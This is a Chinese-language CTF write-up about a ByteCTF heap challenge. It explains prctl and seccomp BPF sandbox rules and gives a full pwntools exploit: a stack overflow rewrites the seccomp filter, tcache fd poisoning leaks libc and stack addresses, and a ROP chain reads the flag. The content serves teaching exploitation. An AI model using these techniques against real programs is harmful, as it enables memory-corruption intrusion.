# 一道 CTF 题目学习 prctl 函数的沙箱过滤规则

阅读量 **731555**

|评论 **2**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2019-09-20 15:30:05

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p5.ssl.qhimg.com/t0156bbd844f50ec71d.jpg)

## 前言

bytectf 的一道堆题，涉及到 prctl 函数，之前没有接触过，借这个机会学习一下。

###  checksec

![](https://p1.ssl.qhimg.com/t011aa053545cfb2206.png)

题目环境：glibc 2.27

## 功能分析

照旧将程序加载进入 IDA，分析程序的逻辑。

###  add 函数

这个函数比较简单，直接返回一个 malloc(0x50) 大小的堆块指针。

    
    
    void __fastcall add(unsigned int a1)
    {
      if ( a1 <= 0xF )
      {
        note_list[a1] = malloc(0x50uLL);
        puts("Done!n");
      }
    }
    

###  delete 函数

del 函数也是一样简单，直接 free 掉堆块后置空指针，不存在 UAF 漏洞。

    
    
    int __fastcall del(unsigned int a1)
    {
      int result; // eax
    
      if ( a1 <= 0xF )
      {
        free(note_list[a1]);
        note_list[a1] = 0LL;
        result = puts("Done!n");
      }
      return result;
    }
    

###  edit 函数

在 edit 函数中，size 的值可控，所以这里存在一个溢出。但是 **这个溢出是有条件的** 。

    
    
    unsigned __int64 __fastcall edit(unsigned int a1)
    {
      int v2; // [rsp+14h] [rbp-Ch]
      unsigned __int64 v3; // [rsp+18h] [rbp-8h]
    
      v3 = __readfsqword(0x28u);
      if ( a1 <= 0xF && note_list[a1] )
      {
        printf("Size: ");
        __isoc99_scanf("%u", &v2);
        printf("Content: ", &v2);
        get_input(note_list[a1], v2);               // overflow
        puts("Done!n");
      }
      return __readfsqword(0x28u) ^ v3;
    }
    

跟进 get_input 函数，这里需要 `0x4040E0` 这个地址需要有值，但是这个地方默认是 0。除非找到一处 **任意地址写或者溢出到这里**
，否则这个堆块就会根据输入的 size 值的大小，填充一大堆的任意值。

    
    
    ssize_t __fastcall get_input(void *a1, int a2)
    {
      int fd; // [rsp+1Ch] [rbp-4h]
    
      if ( dword_4040E0 )
        return read(0, a1, a2);
      fd = open("/dev/urandom", 0);
      if ( fd == -1 )
        exit(0);
      return read(fd, a1, a2);
    }
    

  * 注意到这里，在 fd 指针返回 -1 的时候，才会退出， **如果我们这里让他返回 0 呢？** 那他下面就会执行 `read(0, a1, a2)`，这样我们也可以达到可控的目的，这就是我们下面要达到的目的。

###  become_vip 函数

这个函数定义了一大堆的变量，一开始没看懂这个是干啥的，后来发现是用来定义存储结构体变量的。

    
    
    unsigned __int64 vip()
    {
      __int16 v1; // [rsp+0h] [rbp-90h]
      char *v2; // [rsp+8h] [rbp-88h]
      char buf; // [rsp+10h] [rbp-80h]
      char v4; // [rsp+30h] [rbp-60h]
      char v5; // [rsp+31h] [rbp-5Fh]
      char v6; // [rsp+32h] [rbp-5Eh]
      char v7; // [rsp+33h] [rbp-5Dh]
      char v8; // [rsp+34h] [rbp-5Ch]
      char v9; // [rsp+35h] [rbp-5Bh]
      char v10; // [rsp+36h] [rbp-5Ah]
      char v11; // [rsp+37h] [rbp-59h]
      char v12; // [rsp+38h] [rbp-58h]
      char v13; // [rsp+39h] [rbp-57h]
      char v14; // [rsp+3Ah] [rbp-56h]
      char v15; // [rsp+3Bh] [rbp-55h]
      char v16; // [rsp+3Ch] [rbp-54h]
      char v17; // [rsp+3Dh] [rbp-53h]
      char v18; // [rsp+3Eh] [rbp-52h]
      char v19; // [rsp+3Fh] [rbp-51h]
      char v20; // [rsp+40h] [rbp-50h]
      char v21; // [rsp+41h] [rbp-4Fh]
      char v22; // [rsp+42h] [rbp-4Eh]
      char v23; // [rsp+43h] [rbp-4Dh]
      char v24; // [rsp+44h] [rbp-4Ch]
      char v25; // [rsp+45h] [rbp-4Bh]
      char v26; // [rsp+46h] [rbp-4Ah]
      char v27; // [rsp+47h] [rbp-49h]
      char v28; // [rsp+48h] [rbp-48h]
      char v29; // [rsp+49h] [rbp-47h]
      char v30; // [rsp+4Ah] [rbp-46h]
      char v31; // [rsp+4Bh] [rbp-45h]
      char v32; // [rsp+4Ch] [rbp-44h]
      char v33; // [rsp+4Dh] [rbp-43h]
      char v34; // [rsp+4Eh] [rbp-42h]
      char v35; // [rsp+4Fh] [rbp-41h]
      char v36; // [rsp+50h] [rbp-40h]
      char v37; // [rsp+51h] [rbp-3Fh]
      char v38; // [rsp+52h] [rbp-3Eh]
      char v39; // [rsp+53h] [rbp-3Dh]
      char v40; // [rsp+54h] [rbp-3Ch]
      char v41; // [rsp+55h] [rbp-3Bh]
      char v42; // [rsp+56h] [rbp-3Ah]
      char v43; // [rsp+57h] [rbp-39h]
      char v44; // [rsp+58h] [rbp-38h]
      char v45; // [rsp+59h] [rbp-37h]
      char v46; // [rsp+5Ah] [rbp-36h]
      char v47; // [rsp+5Bh] [rbp-35h]
      char v48; // [rsp+5Ch] [rbp-34h]
      char v49; // [rsp+5Dh] [rbp-33h]
      char v50; // [rsp+5Eh] [rbp-32h]
      char v51; // [rsp+5Fh] [rbp-31h]
      char v52; // [rsp+60h] [rbp-30h]
      char v53; // [rsp+61h] [rbp-2Fh]
      char v54; // [rsp+62h] [rbp-2Eh]
      char v55; // [rsp+63h] [rbp-2Dh]
      char v56; // [rsp+64h] [rbp-2Ch]
      char v57; // [rsp+65h] [rbp-2Bh]
      char v58; // [rsp+66h] [rbp-2Ah]
      char v59; // [rsp+67h] [rbp-29h]
      char v60; // [rsp+68h] [rbp-28h]
      char v61; // [rsp+69h] [rbp-27h]
      char v62; // [rsp+6Ah] [rbp-26h]
      char v63; // [rsp+6Bh] [rbp-25h]
      char v64; // [rsp+6Ch] [rbp-24h]
      char v65; // [rsp+6Dh] [rbp-23h]
      char v66; // [rsp+6Eh] [rbp-22h]
      char v67; // [rsp+6Fh] [rbp-21h]
      char v68; // [rsp+70h] [rbp-20h]
      char v69; // [rsp+71h] [rbp-1Fh]
      char v70; // [rsp+72h] [rbp-1Eh]
      char v71; // [rsp+73h] [rbp-1Dh]
      char v72; // [rsp+74h] [rbp-1Ch]
      char v73; // [rsp+75h] [rbp-1Bh]
      char v74; // [rsp+76h] [rbp-1Ah]
      char v75; // [rsp+77h] [rbp-19h]
      char v76; // [rsp+78h] [rbp-18h]
      char v77; // [rsp+79h] [rbp-17h]
      char v78; // [rsp+7Ah] [rbp-16h]
      char v79; // [rsp+7Bh] [rbp-15h]
      char v80; // [rsp+7Ch] [rbp-14h]
      char v81; // [rsp+7Dh] [rbp-13h]
      char v82; // [rsp+7Eh] [rbp-12h]
      char v83; // [rsp+7Fh] [rbp-11h]
      char v84; // [rsp+80h] [rbp-10h]
      char v85; // [rsp+81h] [rbp-Fh]
      char v86; // [rsp+82h] [rbp-Eh]
      char v87; // [rsp+83h] [rbp-Dh]
      char v88; // [rsp+84h] [rbp-Ch]
      char v89; // [rsp+85h] [rbp-Bh]
      char v90; // [rsp+86h] [rbp-Ah]
      char v91; // [rsp+87h] [rbp-9h]
      unsigned __int64 v92; // [rsp+88h] [rbp-8h]
    
      v92 = __readfsqword(0x28u);
      puts("OK, but before you become vip, please tell us your name: ");
      v4 = 32;
      v5 = 0;
      v6 = 0;
      v7 = 0;
      v8 = 4;
      v9 = 0;
      v10 = 0;
      v11 = 0;
      v12 = 21;
      v13 = 0;
      v14 = 0;
      v15 = 8;
      v16 = 62;
      v17 = 0;
      v18 = 0;
      v19 = -64;
      v20 = 32;
      v21 = 0;
      v22 = 0;
      v23 = 0;
      v24 = 0;
      v25 = 0;
      v26 = 0;
      v27 = 0;
      v28 = 53;
      v29 = 0;
      v30 = 6;
      v31 = 0;
      v32 = 0;
      v33 = 0;
      v34 = 0;
      v35 = 64;
      v36 = 21;
      v37 = 0;
      v38 = 4;
      v39 = 0;
      v40 = 1;
      v41 = 0;
      v42 = 0;
      v43 = 0;
      v44 = 21;
      v45 = 0;
      v46 = 3;
      v47 = 0;
      v48 = 0;
      v49 = 0;
      v50 = 0;
      v51 = 0;
      v52 = 21;
      v53 = 0;
      v54 = 2;
      v55 = 0;
      v56 = 2;
      v57 = 0;
      v58 = 0;
      v59 = 0;
      v60 = 21;
      v61 = 0;
      v62 = 1;
      v63 = 0;
      v64 = 60;
      v65 = 0;
      v66 = 0;
      v67 = 0;
      v68 = 6;
      v69 = 0;
      v70 = 0;
      v71 = 0;
      v72 = 5;
      v73 = 0;
      v74 = 5;
      v75 = 0;
      v76 = 6;
      v77 = 0;
      v78 = 0;
      v79 = 0;
      v80 = 0;
      v81 = 0;
      v82 = -1;
      v83 = 127;
      v84 = 6;
      v85 = 0;
      v86 = 0;
      v87 = 0;
      v88 = 0;
      v89 = 0;
      v90 = 0;
      v91 = 0;
      read(0, &buf, 0x50uLL);
      printf("Hello, %sn", &buf);
      v1 = 11;
      v2 = &v4;
      if ( prctl(38, 1LL, 0LL, 0LL, 0LL, *&v1, &v4) < 0 )
      {
        perror("prctl(PR_SET_NO_NEW_PRIVS)");
        exit(2);
      }
      if ( prctl(22, 2LL, &v1) < 0 )
      {
        perror("prctl(PR_SET_SECCOMP)");
        exit(2);
      }
      return __readfsqword(0x28u) ^ v92;
    }
    

####  函数分析

开始先是使用 read 函数读取了 0x50 字节大小的数据到栈上：`read(0, &buf,
0x50uLL);`，仔细看这里其实是溢出了，可以覆盖到下面的一些变量：

    
    
    char buf; // [rsp+10h] [rbp-80h]    // buf 大小为 32 字节，向下溢出 48 个字节
    char v4; // [rsp+30h] [rbp-60h]
    char v5; // [rsp+31h] [rbp-5Fh]
    ...
    

接着调用了 prctl 函数，没了解过这个函数，因此本文的重点就是着重来分析一下这个函数的用法。

    
    
    v1 = 11;
    v2 = &v4;
    if ( prctl(38, 1LL, 0LL, 0LL, 0LL, *&v1, &v4）{
        ...
    }
    ...
    if ( prctl(22, 2LL, &v1) < 0 ){
        ...
    }
    

## prctl 函数

先查看一下 [man 手册](http://man7.org/linux/man-pages/man2/prctl.2.html)关于 prctl
函数的介绍：

这个函数可以对进程就行操作， **第一个参数可以指定你想做的事** ，因此第一个参数的可选项非常多。

> operations on a process  
>  prctl() is called with a first argument describing what to do (with values
> defined in <linux/prctl.h>), and further arguments with a significance
> depending on the first one. The first argument can be:

**函数原型** ：

    
    
    #include <sys/prctl.h>
    
    int prctl(int option, unsigned long arg2, unsigned long arg3, unsigned long arg4, unsigned long arg5);
    

第一个参数是指定相应的操作，在手册上有特别多的选项，这里我们需要重点关注两个：

    
    
    1. PR_SET_NO_NEW_PRIVS
    2. PR_SET_SECCOMP
    

继续看手册上的介绍，对于第一个参数选项：

    
    
    Set the calling thread’s no_new_privs attribute to the value in arg2.  With no_new_privs set to 1, execve(2) promises not to grant privileges to do anything that could not have been done without the execve(2) call (for example, rendering the set-user-ID and set-group-ID mode bits, and file capabilities non-functional).  
    
    Once set, this the no_new_privs attribute cannot be unset.  The setting of this attribute is inherited by children created by fork(2) and clone(2), and preserved across execve(2).
    

简单的说就是如果 option 设置为 `PR_SET_NO_NEW_PRIVS` 的话，第二个参数如果设置为 1 的话， **不能够进行 execve
的系统调用，同时这个选项还会继承给子进程** 。

  * 这样的话常规的调用 system 函数、one_gadget 的用不了了，这里的设置点其实和 **pwnable.tw 上 orw 那道题一样，只能进行几个系统调用：open、write、read** 。

这里也就是调用下面的语句进行设置：

    
    
    prctl(PR_SET_NO_NEW_PRIVS, 1LL...);
    

在 `include/linux/prctl.h` 中找到 `PR_SET_NO_NEW_PRIVS` 常量对应的数值，正好是
38，因此也就对应上了题目中的第一个 prctl 语句，那很明显 v4 就是一个设置规则的结构体指针， **我们完全可以覆盖他来构造沙箱规则** 。

![](https://p3.ssl.qhimg.com/t01632ba937e7e44cfb.png)

接着看第二个options `PR_SET_SECCOMP`：

    
    
    Set the secure computing (seccomp) mode for the calling thread, to limit the available system calls.
    

设置 seccomp ，其实也就是设置沙箱规则，这个 option 有两个子参数：

    
    
    SECCOMP_MODE_STRICT：
        the only system calls that the thread is permitted to make are read(2), write(2),_exit(2) (but not exit_group(2)), and sigreturn(2). 
    
    SECCOMP_MODE_FILTER (since Linux 3.5)：
        the system calls allowed are defined by a pointer to a Berkeley Packet Filter passed in arg3.  This argument is a pointer to struct sock_fprog; it can be designed to filter arbitrary system calls and system call arguments.
    

这里如果设置了 `SECCOMP_MODE_STRICT` 模式的话，系统调用只能使用 read, write,_exit 这三个。

如果设置了 `SECCOMP_MODE_FILTER` 的话，系统调用规则就可以被 Berkeley Packet Filter（BPF）
的规则所定义，这玩意就是这里最最重点的东西了。

  * `SECCOMP_MODE_FILTER` 表示的常量为 2，那么在第二个 prctl 函数中，执行的就是：`prctl(,SECCOMP_MODE_FILTER,PR_SET_SECCOMP,&v1)`

###  BPF 规则介绍

来看看百度百科上的解释：

![](https://p1.ssl.qhimg.com/dm/1024_344_/t017cb9448b8c557efb.png)

看解释可以知道这是一种网络数据包传输过滤的一种规则，那个怎么会用在 C 语言的 prctl 函数中呢？大佬的解释是这样的：

![](https://p4.ssl.qhimg.com/t01a1cef0c71da098ca.png)

![](https://p3.ssl.qhimg.com/t010bc27c1d5e7dff41.png)

那这样的话就需要了解 BPF
的沙箱解释规则了，[这篇文章](http://www.360doc.com/content/06/1026/17/13362_241408.shtml)写的还不错，可以做参考。

> BPF 定义了一个伪机器。这个伪机器可以执行代码，有一个累加器，寄存器，和赋值、算术、跳转指令。一条指令由一个定义好的结构 struct
> bpf_insn 表示，与真正的机器代码很相似，若干个这样的结构组成的数组，就成为 BPF 的指令序列。

总结起来就下面的一些点：

  1. **结构赋值操作指令为** ：BPF_STMT、BPF_JUMP
  2. **BPF 的主要指令有** BPF_LD，BPF_ALU，BPF_JMP，BPF_RET 等。BPF_LD 将数据装入累加器，BPF_ALU 对累加器执行算术命令，BPF_JMP 是跳转指令，BPF_RET 是程序返回指令
  3. **BPF 条件判断跳转指令** ：BPF_JMP、BPF_JEQ，根据后面的几个参数进行判断，然后跳转到相应的地方。
  4. **返回指令** ：BPF_RET、BPF_K，返回后面参数的值

例如对于这题，构造的沙箱规则为：

    
    
    struct sock_filter filter[] = {
        BPF_STMT(BPF_LD|BPF_W|BPF_ABS, 0),          // 从第0个字节位置开始，加载读取系统调用号
        BPF_JUMP(BPF_JMP|BPF_JEQ, 257, 1, 0),       // 比较系统调用号是否为 257（257 是 openat 的系统调用），是就跳到第5行
        BPF_JUMP(BPF_JMP|BPF_JGE, 0, 1, 0),         // 比较系统调用号是否大于 0，是就跳到第6行
        BPF_STMT(BPF_RET|BPF_K, SECCOMP_RET_ERRNO), // 拒绝系统调用，返回 0
        BPF_STMT(BPF_RET|BPF_K, SECCOMP_RET_ALLOW), // 允许系统调用
    };
    

  * 对于 `SECCOMP_RET_ALLOW` 的解释如下，那么 `SECCOMP_RET_ERRNO` 相应的就是不执行系统调用。

![](https://static.zybuluo.com/H4l0/lp2lo6e7hwl02wj1lzmbtewp/image.png)

相应的转换为 16 进制格式为：

    
    
    \x00\x00\x00\x00\x00\x00\x00\x15\x00\x01\x00\x01\x01\x00\x005\x00\x01\x00\x00\x00\x00\x00\x06\x00\x00\x00\x00\x00\x05\x00\x06\x00\x00\x00\x00\x00\xff\x7f'
    

  * 这里转换的过程可以自己用 C 写一个规则，然后在 gdb 调试中查看对应的数值。

如下，在栈上就可以看到相关过滤规则对应的具体的值，把他取出来就行了。

![](https://p0.ssl.qhimg.com/t01151abfea91de662b.png)

###  seccomp-tools 工具

或者这边可以使用 github 上的一个[工具](https://github.com/david942j/seccomp-tools)：

用法很简单，直接 dump、asm 就行了，详细可以看 README 。看看原来的规则：

![](https://p1.ssl.qhimg.com/t017c0dfa74fda11f68.png)

自己写一个 asm 脚本，然后把 **openat 系统调用** 返回改成 0（open 函数的会调用 openat 系统调用），其他系统调用都放行即可：

    
    
    A = sys_number
    A == openat ? ok:allow
    
    ok:
    return ERRNO(0)
    allow:
    return ALLOW
    

  * 这里我们只能写最多 48/8 = 6 条规则。

接着调用 `seccomp-tools asm test3.asm` 就行：

![](https://p5.ssl.qhimg.com/dm/1024_292_/t0187c2a081255b5102.png)

## 解题步骤

根据上面的分析，我们在 become_vip 函数中， **根据那个溢出点** ，设置 prctl 函数的沙箱规则， **使得 openat
系统调用的返回值为 0 之后，我们就可以控制溢出的数据** 。

构造两个堆块，将后一个堆块 free 之后，从第一个堆块溢出到第二个块的 fd 指针（注意是 2.27 的环境），就能够达到任意地址读写的目的。我们无法调用
system 函数，但是可以使用 ROP 来进行系统调用读取 flag（open、read、write），这里我们就用任意地址写， **将 payload
直接写到栈上来控制返回地址** 。

###  构造沙箱规则

filter1 总共 40 个字节，我们可输入的为 48 个字节：

    
    
    filter1 = '\x00\x00\x00\x00\x00\x00\x00\x15\x00\x01\x00\x01\x01\x00\x005\x00\x01\x00\x00\x00\x00\x00\x06\x00\x00\x00\x00\x00\x05\x00\x06\x00\x00\x00\x00\x00\xff\x7f'
    sh.sendlineafter('choice: ', '6')
    sh.sendafter('name: ', 'a' * 32 + filter1)
    

这时 edit 的时候，就可以发现这里的 **存在溢出点输入我们已经可控了** ，这里对应着下面覆盖 fd 指针的操作，使用 leak 可以正常泄露出
libc 地址了。

    
    
    for i in range(5):
        alloc(i)
    
    delete(2)
    delete(1)
    edit(0, 0x100, 'a' * 0x50 + p64(0) + p64(0x61) + p64(elf.symbols['stderr']))
    

![](https://p4.ssl.qhimg.com/t01556bd655d817df01.png)

###  泄露 libc、栈地址

这个不多说，控制 fd 指针、使用 show 功能泄露 libc 地址。

    
    
    delete(2)
    delete(1)
    edit(0, 0x100, 'a' * 0x50 + p64(0) + p64(0x61) + p64(elf.symbols['stderr']))
    alloc(1)
    alloc(2)
    
    show(2)
    result = sh.recvuntil('n', drop=True)
    libc_addr = u64(result.ljust(8, '')) - libc.symbols['_IO_2_1_stderr_']
    log.success('libc_addr: ' + hex(libc_addr))
    
    delete(3)
    delete(1)
    edit(0, 0x100, 'a' * 0x50 + p64(0) + p64(0x61) + p64(libc_addr + libc.symbols['environ']))
    alloc(1)
    alloc(2)
    show(2)
    

经过调试可以发现 environ 变量的地址 **减去 0xf8 的地方就是 main 函数 rbp 的地址** 。

![](https://p4.ssl.qhimg.com/dm/1024_631_/t0150104a4d9188a414.png)

###  构造 ROP 链

在栈上构造 ROP 链的调用的顺序为：

    
    
    fd = open('flag',0) --> read(fd,buf,0x100) --> write(1,buf,0x100) --> exit()
    

ROP 地址使用 ROPgadget 就可以找到，这里注意的是，在使用 syscall 汇编指令的时候， **调用号是存放在 eax 寄存器中**
，别的参数就和 64 位下的寄存器传参顺序一致。在 amd64 中，系统调用号可以在 `/usr/include/x86_64-linux-gnu/asm/unistd_64.h` 中找到。

![](https://p0.ssl.qhimg.com/dm/1024_575_/t019ef461b1ba9c6d45.png)

    
    
    layout = [
        "flagx00x00x00x00", # ret
        0x0000000000401016, # ret
        0x0000000000401016, # ret
        0x0000000000401016, # ret
    
        0x00000000004018fb, # : pop rdi ; ret
        stack_addr - 0xf8,
        0x00000000004018f9, # : pop rsi ; pop r15 ; ret
        0,
        0,
        libc_addr + 0x00000000000439c8, # : pop rax ; ret
        2, # sys_open
        libc_addr + 0x00000000000d2975, # : syscall ; ret
        0x00000000004018fb, # : pop rdi ; ret
        3,
        0x00000000004018f9, # : pop rsi ; pop r15 ; ret
        0x404800,
        0,
        libc_addr + 0x0000000000001b96, # : pop rdx ; ret
        0x100,
        elf.plt['read'],
    
        0x00000000004018fb, # pop rdi
        1,
        0x00000000004018f9, # pop rsi
        0x404800,
        0,
        libc_addr + 0x0000000000001b96, # pop rdx
        0x50,
    
        libc_addr + 0x00000000000439c8, # pop eax
        1,
        libc_addr + 0x00000000000d2975, #syscall
    
        elf.plt['exit']
    
    ]
    

  * 这里的 read、write 可以直接使用调用库函数 read_plt、puts_plt 来替代。

###  send payload

在 main 函数退出时就会触发 exp，经过 ROP 之后就会输出 flag。

    
    
    edit(2,0x100,flat(layout).ljust(0x100,"x00"))
    sh.sendlineafter('choice: ', '5')
    

![](https://p5.ssl.qhimg.com/dm/1024_396_/t01c9323e309f2f83dc.png)

## Exploit

附上 Ex 师傅的 exp，这里改动了一点点：

    
    
    # 考点：绕过 prctl 沙箱规则，栈上 ROP 的 syscall 调用
    
    #!/usr/bin/python2
    # -*- coding:utf-8 -*-    
    from pwn import *
    import os
    import struct
    import random
    import time
    import sys
    import signal
    
    salt = os.getenv('GDB_SALT') if (os.getenv('GDB_SALT')) else ''
    
    def clear(signum=None, stack=None):
        print('Strip  all debugging information')
        os.system('rm -f /tmp/gdb_symbols{}* /tmp/gdb_pid{}* /tmp/gdb_script{}*'.replace('{}', salt))
        exit(0)
    
    for sig in [signal.SIGINT, signal.SIGHUP, signal.SIGTERM]: 
        signal.signal(sig, clear)
    
    
    context.arch = 'amd64'
    
    execve_file = './vip'
    # sh = process(execve_file, env={'LD_PRELOAD': '/tmp/gdb_symbols{}.so'.replace('{}', salt)})
    # sh = process(execve_file)
    
    sh = process('./vip')
    print pidof(sh)
    elf = ELF(execve_file)
    # libc = ELF('./libc-2.27.so')
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    
    try:
        gdbscript = '''
        b *0x401898
        '''
    
        f = open('/tmp/gdb_pid{}'.replace('{}', salt), 'w')
        f.write(str(proc.pidof(sh)[0]))
        f.close()
    
        f = open('/tmp/gdb_script{}'.replace('{}', salt), 'w')
        f.write(gdbscript)
        f.close()
    except Exception as e:
        print(e)
    
    def alloc(index):
        sh.sendlineafter('choice: ', '1')
        sh.sendlineafter('Index: ', str(index))
    
    def edit(index, size, content):
        sh.sendlineafter('choice: ', '4')
        sh.sendlineafter('Index: ', str(index))
        sh.sendlineafter('Size: ', str(size))
        sh.sendafter('Content: ', content)
    
    def delete(index):
        sh.sendlineafter('choice: ', '3')
        sh.sendlineafter('Index: ', str(index))
    
    def show(index):
        sh.sendlineafter('choice: ', '2')
        sh.sendlineafter('Index: ', str(index))
    
    filter1 = ' x00x00x00x00x00x00x00x15x00x01x00x01x01x00x005x00x01x00x00x00x00x00x06x00x00x00x00x00x05x00x06x00x00x00x00x00xffx7f'
    sh.sendlineafter('choice: ', '6')
    sh.sendafter('name: ', 'a' * 32 + filter1)
    
    for i in range(5):
        alloc(i)
    
    delete(2)
    delete(1)
    edit(0, 0x100, 'a' * 0x50 + p64(0) + p64(0x61) + p64(elf.symbols['stderr']))
    alloc(1)
    alloc(2)
    
    show(2)
    result = sh.recvuntil('n', drop=True)
    libc_addr = u64(result.ljust(8, '')) - libc.symbols['_IO_2_1_stderr_']
    log.success('libc_addr: ' + hex(libc_addr))
    
    delete(3)
    delete(1)
    edit(0, 0x100, 'a' * 0x50 + p64(0) + p64(0x61) + p64(libc_addr + libc.symbols['environ']))
    alloc(1)
    alloc(2)
    show(2)
    
    result = sh.recvuntil('n', drop=True)
    stack_addr = u64(result.ljust(8, ''))
    success("stack_addr: " + hex(stack_addr))
    
    delete(4)
    delete(1)
    edit(0, 0x100, 'a' * 0x50 + p64(0) + p64(0x61) + p64(stack_addr - 0xf8))
    alloc(1)
    alloc(2)
    
    
    layout = [
        "flagx00x00x00x00", # ret
        0x0000000000401016, # ret
        0x0000000000401016, # ret
        0x0000000000401016, # ret
    
        0x00000000004018fb, # : pop rdi ; ret
        stack_addr - 0xf8,
        0x00000000004018f9, # : pop rsi ; pop r15 ; ret
        0,
        0,
        libc_addr + 0x00000000000439c8, # : pop rax ; ret
        2, # sys_open
        libc_addr + 0x00000000000d2975, # : syscall ; ret
        0x00000000004018fb, # : pop rdi ; ret
        3,
        0x00000000004018f9, # : pop rsi ; pop r15 ; ret
        0x404800,
        0,
        libc_addr + 0x0000000000001b96, # : pop rdx ; ret
        0x100,
        elf.plt['read'],
    
        0x00000000004018fb, # pop rdi
        1,
        0x00000000004018f9, # pop rsi
        0x404800,
        0,
        libc_addr + 0x0000000000001b96, # pop rdx
        0x50,
    
        libc_addr + 0x00000000000439c8, # pop eax
        1,
        libc_addr + 0x00000000000d2975, #syscall
    
        elf.plt['exit']
    
    ]
    
    
    edit(2,0x100,flat(layout).ljust(0x100,"x00"))
    sh.sendlineafter('choice: ', '5')
    
    
    sh.interactive()
    

## 总结

这个 prctl 函数的一些知识点还是挺有趣的，学到了不少东西，当然看了别的大佬的文章这道题好像还可以用爆破来做
orz…，[附上链接](https://www.anquanke.com/post/id/186187#h3-6)，师傅们 tql!!

## 参考文章

<https://code.woboq.org/userspace/include/linux/prctl.h.html>  
<http://www.360doc.com/content/06/1026/17/13362_241408.shtml>  
<https://blog.csdn.net/thinkinwm/article/details/8717668>

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **H4lo** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/186447](/post/id/186447)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [CTF](/tag/CTF)

 **+1** __11赞

 __收藏

![](https://p2.ssl.qhimg.com/t0129eee7c67478558f.jpg) H4lo

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

